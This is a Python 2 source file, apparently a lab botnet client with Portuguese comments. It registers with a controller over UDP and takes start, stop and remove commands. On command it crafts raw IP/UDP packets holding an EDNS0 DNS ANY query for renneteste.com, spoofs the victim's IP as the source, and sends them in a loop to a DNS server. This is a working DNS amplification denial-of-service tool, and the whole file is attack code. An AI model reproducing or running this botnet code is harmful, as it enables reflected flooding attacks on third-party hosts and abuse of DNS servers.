
import errno
import threading
from socket import *
import sys
import time
from random import randint
from struct import *
serverName = '192.168.0.102'
serverPort = 12000
clientSocket = socket(AF_INET, SOCK_DGRAM)

clientSocket.sendto('cli'+gethostname(),(serverName, serverPort)) 
server = ('', 0)
ATACANDO = False
event = threading.Event()

def Ataque():
    # create a raw socket
    try:
        s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)
    except error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # tell kernel not to put in headers, since we are providing it
    s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

    # now start constructing the packet
    packet = '';

    source_ip = '192.168.0.102' # vitima do ataque
    dest_ip = '192.168.0.106'  # servidor DNS

    # ip header fields
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20  # python seems to correctly fill the total length, dont know how ??
    id = 54321  # Id of this packet
    frag_off = 0
    ttl = 255
    protocol = IPPROTO_UDP
    check = 10  # python seems to correctly fill the checksum
    saddr = inet_aton(source_ip)  # Spoof the source ip address if you want to
    daddr = inet_aton(dest_ip)

    ihl_version = (version << 4) + ihl
    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

    data = ''
    sport = 9000    # arbitrary source port
    dport = 53   # arbitrary destination port
    length = 51
    checksum = 0
    udp_header = pack('!HHHH', sport, dport, length, checksum)


    trans_ID = 0x6f25
    flags_dns = 0x0120
    questions = 0x0001
    answer = 0
    authority = 0
    additionalRR = 0x0001
    querry_name1 = 0x0a72656e6e657465
    querry_name2 = 0x73746503636f6d00 #renneteste.com
    type_dns = 0x00ff
    class_dns = 0x0001
    additional_name = 0
    additional_type = 0x0029
    udp_payloadsize = 0x1000
    higher = 0
    edns0v = 0
    z = 0
    datal = 0

    dns_header = pack('!HHHHHHQQHHBHHBBHH', trans_ID,flags_dns,questions,answer,authority,additionalRR, querry_name1,querry_name2, type_dns,class_dns,additional_name,additional_type,udp_payloadsize,higher,edns0v,z,datal)

    # final full packet - syn packets dont have any data
    packet = ip_header + udp_header + dns_header


    # Send the packet finally - the port specified has no effect
    print 'Enviando ataque para ' + source_ip
    
    while 1:
        event.wait()
        id =randint(0,65534) 
        ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
        packet = ip_header + udp_header + dns_header
        print 'enviando pacote ' + str(id)
        time.sleep(1)
        s.sendto(packet, (dest_ip, 0))  # put this in a loop if you want to flood the target



def ThreadEnvio():
    ATACANDO = False
    t = threading.Thread(target = Ataque, args=())
    t.daemon = True 
    print 'Tentando conectar-se ao gerente'
    while True:
        try:
            rcv, serverAddress = clientSocket.recvfrom(2048) 
        except error, e:
            if e[0] == errno.WSAECONNRESET:
                print 'Gerente desconectado'
                continue

        if rcv == 'acc':
            print 'Conectado ao gerente'

        if rcv == 'atk':
            ATACANDO = True
            if t.isAlive() == False:
                t.start();
            event.set()

        if rcv == 'stp':
            print 'Parando ataque'
            ATACANDO = False
            event.clear()
            
        if rcv == 'rem':
            event.clear()
            print 'Botnet desconectada'
            raise SystemExit

try:
    thread = threading.Thread(target = ThreadEnvio, args=())
    thread.daemon = True 
    thread.start();
    while thread.isAlive(): 
        thread.join(1)

except KeyboardInterrupt, SystemExit:
    print 'Saindo...'
    clientSocket.sendto('off'+gethostname(), (serverName, serverPort)) 
    clientSocket.close()      

    exit(0)

